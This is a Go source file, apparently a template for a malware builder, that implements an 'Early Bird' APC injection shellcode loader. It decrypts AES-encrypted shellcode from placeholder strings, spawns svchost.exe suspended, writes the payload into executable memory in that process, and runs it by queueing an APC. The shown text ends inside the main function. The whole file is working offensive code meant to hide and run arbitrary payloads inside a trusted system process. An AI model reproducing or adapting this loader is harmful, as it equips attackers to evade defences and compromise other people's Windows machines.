package main

import (
    "fmt"
    "encoding/base64"
    "crypto/aes"
    "crypto/cipher"
    "syscall"
    "unsafe"
    "golang.org/x/sys/windows"
)

var (
    modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
    procVirtualAllocEx = modkernel32.NewProc("VirtualAllocEx")
    procWriteProcessMemory = modkernel32.NewProc("WriteProcessMemory")
    procQueueUserAPC = modkernel32.NewProc("QueueUserAPC")
)

func decryptShellcode(enc []byte, key []byte) []byte {
    iv := enc[:16]
    ciphertext := enc[16:]
    block, _ := aes.NewCipher(key)
    mode := cipher.NewCBCDecrypter(block, iv)
    decrypted := make([]byte, len(ciphertext))
    mode.CryptBlocks(decrypted, ciphertext)
    padding := int(decrypted[len(decrypted)-1])
    return decrypted[:len(decrypted)-padding]
}

func injectEarlyBird(shellcode []byte) {
    targetProc := `C:\Windows\System32\svchost.exe`
    procInfo := windows.ProcessInformation{}
    startInfo := windows.StartupInfo{}

    targetProcPtr, _ := syscall.UTF16PtrFromString(targetProc)
    err := windows.CreateProcess(
        nil,
        targetProcPtr,
        nil,
        nil,
        false,
        windows.CREATE_SUSPENDED,
        nil,
        nil,
        &startInfo,
        &procInfo,
    )
    if err != nil {
        fmt.Println("CreateProcess failed:", err)
        return
    }

    baseAddress := VirtualAllocEx(procInfo.Process, uintptr(len(shellcode)))
    if baseAddress == 0 {
        fmt.Println("VirtualAllocEx failed")
        return
    }

    WriteProcessMemory(procInfo.Process, baseAddress, &shellcode[0], uintptr(len(shellcode)))
    queueApc(procInfo.Thread, baseAddress)
    alertResumeThread(procInfo.Thread)
}

func VirtualAllocEx(hProcess windows.Handle, dwSize uintptr) uintptr {
    addr, _, _ := procVirtualAllocEx.Call(
        uintptr(hProcess),
        0,
        dwSize,
        windows.MEM_COMMIT|windows.MEM_RESERVE,
        windows.PAGE_EXECUTE_READWRITE,
    )
    return addr
}

func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr) bool {
    var bytesWritten uintptr
    ret, _, _ := procWriteProcessMemory.Call(
        uintptr(hProcess),
        lpBaseAddress,
        uintptr(unsafe.Pointer(lpBuffer)),
        nSize,
        uintptr(unsafe.Pointer(&bytesWritten)),
    )
    return ret != 0
}

func queueApc(hThread windows.Handle, addr uintptr) {
    ret, _, err := procQueueUserAPC.Call(
        addr,
        uintptr(hThread),
        0,
    )
    if ret == 0 {
        fmt.Println("QueueUserAPC failed:", err)
    }
}

func alertResumeThread(hThread windows.Handle) {
    windows.ResumeThread(hThread)
}

func main() {
    encryptedShellcode, _ := base64.StdEncoding.DecodeString("%s")
    aesKey, _ := base64.StdEncoding.DecodeString("%s")
    shellcode := decryptShellcode(encryptedShellcode, aesKey)
  
    injectEarlyBird(shellcode)
